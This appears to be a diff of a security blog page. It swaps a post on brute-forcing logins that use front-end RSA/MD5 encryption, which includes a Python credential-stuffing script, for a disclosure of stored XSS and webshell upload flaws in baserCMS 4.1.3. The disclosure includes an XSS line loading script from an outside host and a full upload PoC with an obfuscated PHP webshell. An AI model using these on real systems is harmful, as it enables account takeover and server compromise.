@@ -68,7 +68,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="爆破，js加密," />
+  <meta name="keywords" content="basercms，漏洞披漏," />
 
 
 
@@ -86,30 +86,30 @@
 
 
 
-<meta name="description" content="1.1 简述：最近遇到两个个案例，经过一番倒腾，发现其登录功能均可撞库。但是都存在登录数据本地加密，有空了放一起总结记录一下。">
-<meta name="keywords" content="爆破，js加密">
+<meta name="description" content="DescriptionbaserCMS（ベーサーシーエムエス）とは、直感的な操作と高いメンテナンス性を実現し、Webサイトを自由にカスタマイズできる国産CMS（コンテンツ・マネージメント・システム）です。日本人が日本人の為に、みんなで作っているオープンソース・ソフトウェアです。無料で利用でき、様々なサーバーで動作可能で、インストールも簡単です。">
+<meta name="keywords" content="basercms，漏洞披漏">
 <meta property="og:type" content="article">
-<meta property="og:title" content="如何对经前端加密后的数据进行爆破">
-<meta property="og:url" content="http://sunu11.com/2018/07/23/21/index.html">
+<meta property="og:title" content="baserCMS 漏洞披漏">
+<meta property="og:url" content="http://sunu11.com/2018/10/31/baserCMS/index.html">
 <meta property="og:site_name" content="SuNu11&#39;Blog">
-<meta property="og:description" content="1.1 简述：最近遇到两个个案例，经过一番倒腾，发现其登录功能均可撞库。但是都存在登录数据本地加密，有空了放一起总结记录一下。">
+<meta property="og:description" content="DescriptionbaserCMS（ベーサーシーエムエス）とは、直感的な操作と高いメンテナンス性を実現し、Webサイトを自由にカスタマイズできる国産CMS（コンテンツ・マネージメント・システム）です。日本人が日本人の為に、みんなで作っているオープンソース・ソフトウェアです。無料で利用でき、様々なサーバーで動作可能で、インストールも簡単です。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/21-1.png">
-<meta property="og:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/21-2.png">
-<meta property="og:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/21-3.png">
-<meta property="og:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/21-4.png">
-<meta property="og:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/21-5.png">
-<meta property="og:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/21-6.png">
-<meta property="og:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/21-7.png">
-<meta property="og:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/21-8.png">
-<meta property="og:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/21-9.png">
-<meta property="og:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/21-10.png">
-<meta property="og:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/21-11.png">
-<meta property="og:updated_time" content="2018-10-18T08:22:24.660Z">
+<meta property="og:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/baser-1.png">
+<meta property="og:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/baser-2.png">
+<meta property="og:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/baser-3.png">
+<meta property="og:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/baser-4.png">
+<meta property="og:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/baser-5.png">
+<meta property="og:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/baser-6.png">
+<meta property="og:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/baser-7.png">
+<meta property="og:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/baser-8.png">
+<meta property="og:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/baser-9.png">
+<meta property="og:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/baser-10.png">
+<meta property="og:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/baser-11.png">
+<meta property="og:updated_time" content="2018-10-31T11:02:05.592Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="如何对经前端加密后的数据进行爆破">
-<meta name="twitter:description" content="1.1 简述：最近遇到两个个案例，经过一番倒腾，发现其登录功能均可撞库。但是都存在登录数据本地加密，有空了放一起总结记录一下。">
-<meta name="twitter:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/21-1.png">
+<meta name="twitter:title" content="baserCMS 漏洞披漏">
+<meta name="twitter:description" content="DescriptionbaserCMS（ベーサーシーエムエス）とは、直感的な操作と高いメンテナンス性を実現し、Webサイトを自由にカスタマイズできる国産CMS（コンテンツ・マネージメント・システム）です。日本人が日本人の為に、みんなで作っているオープンソース・ソフトウェアです。無料で利用でき、様々なサーバーで動作可能で、インストールも簡単です。">
+<meta name="twitter:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/baser-1.png">
 
 
 
@@ -137,13 +137,13 @@
 
 
 
-  <link rel="canonical" href="http://sunu11.com/2018/07/23/21/"/>
+  <link rel="canonical" href="http://sunu11.com/2018/10/31/baserCMS/"/>
 
 
 
 
 
-  <title> 如何对经前端加密后的数据进行爆破 | SuNu11'Blog </title>
+  <title> baserCMS 漏洞披漏 | SuNu11'Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -284,7 +284,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://sunu11.com/2018/07/23/21/">
+  <link itemprop="mainEntityOfPage" href="http://sunu11.com/2018/10/31/baserCMS/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
     <meta itemprop="name" content="SuNu11">
@@ -308,7 +308,7 @@
             
             
               
-                如何对经前端加密后的数据进行爆破
+                baserCMS 漏洞披漏
               
             
           </h1>
@@ -321,8 +321,8 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-07-23T15:50:45+08:00">
-                2018-07-23
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-31T17:07:23+08:00">
+                2018-10-31
               </time>
             
 
@@ -355,8 +355,8 @@
             
               <span class="post-comments-count">
                 <span class="post-meta-divider">|</span>
-                <a href="/2018/07/23/21/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2018/07/23/21/" itemprop="commentCount"></span>
+                <a href="/2018/10/31/baserCMS/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2018/10/31/baserCMS/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -382,51 +382,18 @@
       
 
       
-        <h2 id="1-1-简述："><a href="#1-1-简述：" class="headerlink" title="1.1 简述："></a>1.1 简述：</h2><p>最近遇到两个个案例，经过一番倒腾，发现其登录功能均可撞库。但是都存在登录数据本地加密，有空了放一起总结记录一下。<a id="more"></a></p>
-<h2 id="2-1-案例1-RSA本地加密"><a href="#2-1-案例1-RSA本地加密" class="headerlink" title="2.1 案例1(RSA本地加密):"></a>2.1 案例1(RSA本地加密):</h2><h3 id="2-1-1-摸底："><a href="#2-1-1-摸底：" class="headerlink" title="2.1.1 摸底："></a>2.1.1 摸底：</h3><blockquote>
-<p>首先，进行正常登录逻辑测试，发现该系统登录逻辑分下面两步：<br>1、输入正确用户名密码，校验正确后，向注册手机号发送验证码。<br>2、输入正确验证码，登录系统。</p>
-</blockquote>
-<p>从该逻辑可知此处可通过填写登录用户名密码后是否发送验证码来判断输入数据是否为正确用户登录凭证，由于站点未对获取验证码提交频率作任何限制，从而可自动化提交来获取该站点正确用户名密码。</p>
-<h3 id="2-1-2-演习："><a href="#2-1-2-演习：" class="headerlink" title="2.1.2 演习："></a>2.1.2 演习：</h3><blockquote>
-<p>在google的过程中，很快的找到了一款burpsuite套件：jsEncrypter（感谢作者提供这么利索的插件）。下载地址：<a href="https://github.com/c0ny1/jsEncrypter/releases。" target="_blank" rel="external">https://github.com/c0ny1/jsEncrypter/releases。</a><br>安装完成后，我们将jsencrypt.min.js下载至本地。然后对站点系统前端代码进行调试，分析前端处理过程，编写js模板文件。</p>
-</blockquote>
-<p>对登录过程进行调试：<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-1.png" alt="21-1"></p>
-<blockquote>
-<p>在审计前端源代码页面中，可以找到，在ui目录下的lib文件夹下有一个security文件夹，而其中的rsa_util.js就是调用jsencrypt.min.js文件种的JSEncrypt方法对用户名密码进行加密。</p>
-</blockquote>
-<p>下图为动态调试结果：<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-2.png" alt="21-2"></p>
-<blockquote>
-<p>我们可以很清楚看到加密过程，然后根据jsEncrypter的readme文档中的使用指南，我们可以根据其调用逻辑，自行编写一个jsEncrypter_rsa.js文件，来调用jsencrypt.min.js文件为我们的明文数据进行加密。</p>
-</blockquote>
-<p>这里有两个小坑：</p>
-<blockquote>
-<p>1、由动态调试可知，公钥_pubk在cookie中以url编码后的方式存储，因此，我们本地调用，需要解码一下，在这里，对于换行符，需要用\n替换。<br>2、由于jsEncrypter插件使用了phantomjs平台，而phantomjs支持url解码的函数为encodeURIComponent。因此不能使用与系统前端一致的encodeURI函数。</p>
-</blockquote>
-<p>然后仿写系统加密的方式，将公钥以及调用逻辑写入到我们自己的js文件中：</p>
-<p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-3.png" alt="21-3"></p>
-<h3 id="2-1-3-攻击："><a href="#2-1-3-攻击：" class="headerlink" title="2.1.3 攻击："></a>2.1.3 攻击：</h3><p>1、运行phantomJS并测试</p>
-<p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-4.png" alt="21-4"></p>
-<p>2、Burpsuite验证，调用成功：</p>
-<p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-5.png" alt="21-5"></p>
-<p>3、抓包，加载字典，实施爆破：（两个参数的字典都使用插件）</p>
-<p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-6.png" alt="21-6"></p>
-<p>然后，成功爆破:</p>
-<p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-7.png" alt="21-7"></p>
-<h2 id="2-2-案例2-md5本地加密"><a href="#2-2-案例2-md5本地加密" class="headerlink" title="2.2 案例2(md5本地加密):"></a>2.2 案例2(md5本地加密):</h2><h3 id="2-2-1-摸底："><a href="#2-2-1-摸底：" class="headerlink" title="2.2.1 摸底："></a>2.2.1 摸底：</h3><blockquote>
-<p>首先通过分析用户登录过程，发现该站点登录无验证码，可多次提交登录数据，但是其用户名密码在本地进行了md5加密处理。因此，撞库之前需要本地实现将字典进行加密操作后再提交。<br>对登录功能抓包分析后，可以看到在填写用户名密码后，前端发送如下数据包获取cd、salt数据包：</p>
-</blockquote>
-<p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-8.png" alt="21-8"></p>
-<p>此处存在salt泄漏风险，可遍历手机号，对于未注册⽤用户，返回值⽆salt，对于已注册⽤户salt值恒定。<br>而实施撞库，需要先请求得到salt与cd值。</p>
-<p>然后可从前端代码中得到加密用户名密码过程：</p>
-<p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-9.png" alt="21-9"></p>
-<p>pass经过本地md5加密后， 发送至服务端进行登录校验。</p>
-<h3 id="2-2-2-演习："><a href="#2-2-2-演习：" class="headerlink" title="2.2.2 演习："></a>2.2.2 演习：</h3><p>因此，我们只需要用脚本，先输入用户名即手机号，请求得到cd、salt值，然后再从密码字典中，取出密码进行md5加密，最后发包请求即可。编写python脚本如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line">#-*- coding=utf-8 -*-</div><div class="line"></div><div class="line">import requests</div><div class="line">import hashlib</div><div class="line">import json</div><div class="line"></div><div class="line"></div><div class="line">def GetPass():</div><div class="line">	fp = open(&quot;./pass.txt&quot;,&quot;r&quot;)</div><div class="line">	if fp == 0:</div><div class="line">		print (&quot;open file error!&quot;)</div><div class="line">		return;</div><div class="line">	while 1:</div><div class="line">		line = fp.readline()</div><div class="line">		if not line:</div><div class="line">			break</div><div class="line">		passwd = line.strip(&apos;\n&apos;)</div><div class="line">		Brute_Force_Dididai(&quot;150****1403&quot;,passwd);</div><div class="line"></div><div class="line">def Brute_Force_Dididai(username,password):</div><div class="line"></div><div class="line">	# url = &quot;&quot;</div><div class="line">    s = requests.Session()</div><div class="line">	s.headers = &#123;</div><div class="line">	            &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/51.0.2704.103 Safari/537.36&apos;,</div><div class="line">	            &apos;X-Requested-With&apos;: &apos;XMLHttpRequest&apos;,</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">	url = &quot;http://www.foo.com/?m=&amp;s=getcd&quot;</div><div class="line">	data = &#123;&quot;username&quot;:username&#125;</div><div class="line"></div><div class="line">	html = s.post(url,data = data)</div><div class="line"></div><div class="line">	print html.content</div><div class="line">	salt_cd = json.loads(html.content)</div><div class="line">	print salt_cd[&apos;salt&apos;]</div><div class="line">	print salt_cd[&apos;cd&apos;]</div><div class="line">	md5_pass = hashlib.md5(password.encode(&apos;utf-8&apos;)).hexdigest()+salt_cd[&apos;salt&apos;]</div><div class="line">	md5_salt = hashlib.md5(md5_pass.encode(&apos;utf-8&apos;)).hexdigest()+str(salt_cd[&apos;cd&apos;])</div><div class="line">	md5_cd = hashlib.md5(md5_salt.encode(&apos;utf-8&apos;)).hexdigest()</div><div class="line">	print md5_cd</div><div class="line"></div><div class="line">	url1 = &quot;http://www.foo.com/?m=&amp;s=login_wd&amp;ismd5=1&quot;</div><div class="line">	data1 = &#123;&quot;username&quot;:&quot;username&quot;,&quot;password&quot;:md5_cd&#125;</div><div class="line">	html1 = s.post(url1,data = data1)</div><div class="line">	print html1.content</div><div class="line">	print len(html1.content);</div><div class="line"></div><div class="line">GetPass()</div></pre></td></tr></table></figure>
-<p>然后准备测试pass.txt:</p>
-<p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-10.png" alt="21-10"></p>
-<h3 id="2-2-3-攻击："><a href="#2-2-3-攻击：" class="headerlink" title="2.2.3 攻击："></a>2.2.3 攻击：</h3><p>最后只需要执行脚本即可：</p>
-<p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/21-11.png" alt="21-11"></p>
-<p>最后是爆破成功返回到数据包，由此可得到正确用户名密码。<br>freebuf地址<a href="http://www.freebuf.com/articles/web/184455.html" target="_blank" rel="external">http://www.freebuf.com/articles/web/184455.html</a></p>
+        <h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>baserCMS（ベーサーシーエムエス）とは、直感的な操作と高いメンテナンス性を実現し、Webサイトを自由にカスタマイズできる国産CMS（コンテンツ・マネージメント・システム）です。日本人が日本人の為に、みんなで作っているオープンソース・ソフトウェアです。無料で利用でき、様々なサーバーで動作可能で、インストールも簡単です。<a id="more"></a></p>
+<p>オープンソース・フレームワーク「CakePHP」をベースとしているので、カスタマイズ性、メンテナンス性が高いのが特徴です。</p>
+<p>ツリー構造により固定ページ、ブログ、フォームをまとめて管理できる、強力なコンテンツ管理機能を持つCMSです。Webサイトに最低限必要となるメールフォームや新着ブログなどのプラグインや管理画面の枠組みを最初から装備しており、スマートフォンにも標準対応しています。</p>
+<p>マニュアルやソースコードのコメントにおいて日本語を標準としているのも国産CMSの強みです。  ———— it’s copy from <a href="https://basercms.net/about/index.html" target="_blank" rel="external">https://basercms.net/about/index.html</a></p>
+<p>I found two vulnerability in basicCMS 4.1.3.</p>
+<h3 id="storage-xss-vulnerability（fixed）"><a href="#storage-xss-vulnerability（fixed）" class="headerlink" title="storage xss vulnerability（fixed）"></a>storage xss vulnerability（fixed）</h3><p>There is a storage xss vulnerability in the category name editor after login with normal administrator privileges.</p>
+<h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>We register two administrator accounts with different permissions：システム管理 and サイト運営<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-1.png" alt="图1"><br>Log in to the system using サイト運営 privileged account root:<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-2.png" alt="图2"><br>In the Register New Category feature of the Upload menu, the category name can execute a malicious xss statement:<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-3.png" alt="图3"><br>After the administrator logs in, accessing the page triggers:<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-4.png" alt="图4"><br>So，We can insert malicious javascript according to the vulnerability to override the administrator function.<br>For example<br>The root user does not have permission to access<br>“<a href="http://127.0.0.1/basercms/admin/site_configs/del_cache”" target="_blank" rel="external">http://127.0.0.1/basercms/admin/site_configs/del_cache”</a> to delete the server cache information:<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-5.png" alt="图5"><br>We can exploit this vulnerability to implement an attack:<br>Since the <strong><code>data[UploaderCategory][name]</code></strong> parameter has a length limit, We can insert the following statement first:<br><code>&lt;script src=&quot;http://vps_ip/1.js&quot;&gt;&lt;/script&gt;</code><br>Then, 1.js uses ajax to write a get request to<br><code>http://127.0.0.1/basercms/admin/site_configs/del_cache</code>:<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-6.png" alt="图6"><br>Verify: The root (asda)user refreshes the page:<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-7.png" alt="图7"><br>And when the administrator user(ad_lab) accesses the page, it triggers js and deletes the server cache.<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-8.png" alt="图8"><br>Finally, I found the corresponding code with defects.<br>UploaderCategoriesController.php<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-9.png" alt="图9"><br>It was found that the カテゴリ名（<strong><code>data[UploaderCategory][name]</code></strong>）parameter submitted by the user did not filter the malicious characters,</p>
+<h4 id="Solution"><a href="#Solution" class="headerlink" title="Solution:"></a>Solution:</h4><p>Note: The issue has been reported in 2018 09 and was resolved by a developer of baserCMS. <a href="https://basercms.net/release/4_1_4" target="_blank" rel="external">Announcement address</a></p>
+<h3 id="Code-Execution-Vulnerability（fixed）"><a href="#Code-Execution-Vulnerability（fixed）" class="headerlink" title="Code Execution Vulnerability（fixed）"></a>Code Execution Vulnerability（fixed）</h3><h4 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h4><p>Download the latest version of basercms (4.1.3).In \basercms\lib\Baser\Model\ThemeConfig.php, you can see that the uploaded file suffix is not checked, so we can upload the webshell file directly.</p>
+<p>In the saveImage method of \basercms\lib\Baser\Model\ThemeConfig.php we can see that is about saving the logo during the theme setup:<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-10.png" alt="图10"><br>We can seen move_uploaded_file method，Then audit code，It can be seen that the image is saved here and the suffix is not verified.，Only limited the image name (logo)，So you can get server permissions by uploading php webshell.<br>Poc：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line">POST /basercms/admin/theme_configs/form HTTP/1.1</div><div class="line">Host: 127.0.0.1</div><div class="line">Content-Length: 3986</div><div class="line">Cache-Control: max-age=0</div><div class="line">Origin: http://127.0.0.1</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfOCEZtinjMBherH4</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</div><div class="line">Referer: http://127.0.0.1/basercms/admin/theme_configs/form</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</div><div class="line">Cookie: BASERCMS=vfshte61c73tufbvit1j63amv2</div><div class="line">Connection: close</div><div class="line"></div><div class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</div><div class="line">Content-Disposition: form-data; name=&quot;_method&quot;</div><div class="line"></div><div class="line">POST</div><div class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</div><div class="line">Content-Disposition: form-data; name=&quot;data[_Token][key]&quot;</div><div class="line"></div><div class="line">65d6c82611c9eb9840aef42c97d82c36847093f574cbe4c2cb7964537a3d594b19d92b9c116bd3595e0f14ba510a880e1a2573033f81a71dd25800d09917183a</div><div class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</div><div class="line">Content-Disposition: form-data; name=&quot;data[ThemeConfig][color_main]&quot;</div><div class="line"></div><div class="line">e371e3</div><div class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</div><div class="line">Content-Disposition: form-data; name=&quot;data[ThemeConfig][color_sub]&quot;</div><div class="line"></div><div class="line">21b537</div><div class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</div><div class="line">Content-Disposition: form-data; name=&quot;data[ThemeConfig][color_link]&quot;</div><div class="line"></div><div class="line">1808f5</div><div class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</div><div class="line">Content-Disposition: form-data; name=&quot;data[ThemeConfig][color_hover]&quot;</div><div class="line"></div><div class="line">ed8815</div><div class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</div><div class="line">Content-Disposition: form-data; name=&quot;data[ThemeConfig][logo]&quot;; filename=&quot;x.php&quot;</div><div class="line">Content-Type: application/octet-stream</div><div class="line"></div><div class="line">&lt;?php  $a = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;;  $a($_GET[cc]);  ?&gt;</div><div class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</div><div class="line">Content-Disposition: form-data; name=&quot;data[ThemeConfig][logo_alt]&quot;</div><div class="line"></div><div class="line">baserCMS</div><div class="line">------WebKitFormBoundaryfOCEZtinjMBherH4</div><div class="line">Content-Disposition: form-data; name=&quot;data[ThemeConfig][logo_link]&quot;</div><div class="line">...</div></pre></td></tr></table></figure></p>
+<p>Then according to the code description, you can get the webshell path:<br><a href="http://127.0.0.1/basercms/files/theme_configs/logo.php" target="_blank" rel="external">http://127.0.0.1/basercms/files/theme_configs/logo.php</a><br>Command execution:<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/baser-11.png" alt="图11"></p>
+<h4 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution:"></a>Solution:</h4><p>Whitelist restrictions on upload file suffixes such as (jpg, png, gif, jpeg etc.)<br>Note: The issue has been reported in 2018 09 and was resolved by a developer of baserCMS. <a href="https://basercms.net/release/4_1_4" target="_blank" rel="external">Announcement address</a></p>
 
       
     </div>
@@ -453,7 +420,7 @@
  
    <div class="">
    <p><span>
-   <br/><br/><b>本文出处：</b><a href="/2018/07/23/21/" title="如何对经前端加密后的数据进行爆破">http://sunu11.com/2018/07/23/21/</a><br/><span><span><span><span><span><span><b>本文基于：</b><a target="_blank" title="Creative Commons Attribution-ShareAlike 4.0 International (CC BY-SA 4.0)" href="http://creativecommons.org/licenses/by-sa/4.0/"> 知识共享署名-相同方式共享 4.0 </a>国际许可协议发布，欢迎转载，演绎或用于商业目的。但是必须保留本文的署名<a href="http://www.sunu11.com/">sunu11</a>及链接。
+   <br/><br/><b>本文出处：</b><a href="/2018/10/31/baserCMS/" title="baserCMS 漏洞披漏">http://sunu11.com/2018/10/31/baserCMS/</a><br/><span><span><span><span><span><span><b>本文基于：</b><a target="_blank" title="Creative Commons Attribution-ShareAlike 4.0 International (CC BY-SA 4.0)" href="http://creativecommons.org/licenses/by-sa/4.0/"> 知识共享署名-相同方式共享 4.0 </a>国际许可协议发布，欢迎转载，演绎或用于商业目的。但是必须保留本文的署名<a href="http://www.sunu11.com/">sunu11</a>及链接。
    </span></p>
    </div>
  
@@ -483,7 +450,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/爆破，js加密/" rel="tag"><i class="fa fa-tag"></i> 爆破，js加密</a>
+            <a href="/tags/basercms，漏洞披漏/" rel="tag"><i class="fa fa-tag"></i> basercms，漏洞披漏</a>
           
         </div>
       
@@ -492,8 +459,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/07/14/20/" rel="next" title="Elsaticsearch 漏洞小结">
-                <i class="fa fa-chevron-left"></i> Elsaticsearch 漏洞小结
+              <a href="/2018/10/18/glxcms/" rel="next" title="glxcms漏洞披漏">
+                <i class="fa fa-chevron-left"></i> glxcms漏洞披漏
               </a>
             
           </div>
@@ -501,10 +468,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/07/25/22/" rel="prev" title="CVE-2018-12613漏洞学习总结">
-                CVE-2018-12613漏洞学习总结 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -530,8 +493,8 @@
           
   <div class="comments" id="comments">
     
-      <div class="ds-thread" data-thread-key="2018/07/23/21/"
-           data-title="如何对经前端加密后的数据进行爆破" data-url="http://sunu11.com/2018/07/23/21/">
+      <div class="ds-thread" data-thread-key="2018/10/31/baserCMS/"
+           data-title="baserCMS 漏洞披漏" data-url="http://sunu11.com/2018/10/31/baserCMS/">
       </div>
     
   </div>
@@ -698,7 +661,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1-简述："><span class="nav-number">1.</span> <span class="nav-text">1.1 简述：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-案例1-RSA本地加密"><span class="nav-number">2.</span> <span class="nav-text">2.1 案例1(RSA本地加密):</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-1-摸底："><span class="nav-number">2.1.</span> <span class="nav-text">2.1.1 摸底：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-2-演习："><span class="nav-number">2.2.</span> <span class="nav-text">2.1.2 演习：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-3-攻击："><span class="nav-number">2.3.</span> <span class="nav-text">2.1.3 攻击：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-案例2-md5本地加密"><span class="nav-number">3.</span> <span class="nav-text">2.2 案例2(md5本地加密):</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-1-摸底："><span class="nav-number">3.1.</span> <span class="nav-text">2.2.1 摸底：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-2-演习："><span class="nav-number">3.2.</span> <span class="nav-text">2.2.2 演习：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-3-攻击："><span class="nav-number">3.3.</span> <span class="nav-text">2.2.3 攻击：</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Description"><span class="nav-number">1.</span> <span class="nav-text">Description</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#storage-xss-vulnerability（fixed）"><span class="nav-number">2.</span> <span class="nav-text">storage xss vulnerability（fixed）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Example"><span class="nav-number">2.1.</span> <span class="nav-text">Example</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Solution"><span class="nav-number">2.2.</span> <span class="nav-text">Solution:</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Code-Execution-Vulnerability（fixed）"><span class="nav-number">3.</span> <span class="nav-text">Code Execution Vulnerability（fixed）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Process"><span class="nav-number">3.1.</span> <span class="nav-text">Process</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Solution-1"><span class="nav-number">3.2.</span> <span class="nav-text">Solution:</span></a></li></ol></li></ol></div>
             
 
           </div>
